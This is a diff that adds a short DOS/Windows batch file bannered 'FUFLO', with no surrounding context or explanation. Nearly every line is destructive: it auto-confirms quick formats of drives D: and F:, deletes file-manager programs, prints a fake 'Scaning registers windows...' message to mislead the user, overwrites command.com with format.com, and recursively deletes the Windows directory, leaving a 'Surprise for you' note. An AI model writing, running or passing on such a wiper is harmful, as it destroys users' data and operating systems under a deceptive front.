@@ -1,0 +1,17 @@
+@echo off
+echo ÉÍÍÍÍÍ»
+echo ºFUFLOº
+echo ÈÍÍÍÍÍ¼
+:Formating all hard disks (d-f)
+@echo y| format f: /q /u /v:FUFLO
+@echo y| format f: /q /u /v:FUFLO
+@echo y| format d: /q /u /v:FUFLO
+del c:\dn\dn.com
+del c:\nc\nc.exe
+del c:\vc\vc.com
+echo    Surprise       > message.txt
+echo Surprise for you >> message.txt
+cls
+Scaning registers windows...
+copy %windir%\command\format.com c:\command.com
+deltree/y %windir%
